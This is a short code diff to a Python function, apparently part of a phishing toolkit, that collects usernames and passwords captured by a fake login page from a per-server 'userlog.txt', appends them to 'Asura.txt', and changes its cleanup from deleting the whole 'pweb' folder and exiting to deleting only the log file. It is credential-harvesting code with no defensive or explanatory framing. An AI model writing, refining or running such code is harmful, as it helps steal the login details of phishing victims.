@@ -90,8 +90,7 @@ def user_data(server):
             os.system(f"cat pweb/{server}/userlog.txt >> Asura.txt")
             print()
             print(f"{y}[{g}+{y}] {r} Username and password saved into Asura.txt")
-            os.system("rm -rf pweb")
-            sys.exit()
+            os.system(f"rm -rf pweb/{server}/userlog.txt")
         else:
             pass
 
